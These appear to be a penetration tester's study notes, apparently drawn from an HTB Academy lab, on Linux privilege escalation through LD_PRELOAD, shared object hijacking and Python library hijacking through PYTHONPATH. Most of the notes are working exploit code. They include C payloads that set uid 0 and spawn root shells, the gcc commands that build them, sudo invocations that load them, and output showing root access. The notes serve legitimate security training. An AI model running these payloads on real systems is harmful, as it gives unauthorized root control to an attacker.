
LD_PRELOAD Privilege Escalation

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
compile : 
```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart #Apache no password root
```

Shared Object Hijacking : 

```sh
 readelf -d payroll  | grep PATH
 #payroll file with bit Suid
```
Custom LIb : 
```sh
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
ldd payroll
```

exploit : 
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

```sh
gcc src.c -fPIC -shared -o /development/libshared.so
```

python :

```sh
pip3 show psutil #misconfigure lib psutil
```

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

## PYTHONPATH Environment Variable

In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

#### Checking sudo permissions

Python Library Hijacking

```sh
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.

#### Privilege Escalation using PYTHONPATH Environment Variable

Python Library Hijacking

```sh
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

In this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.

Other way to privesc
```sh
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```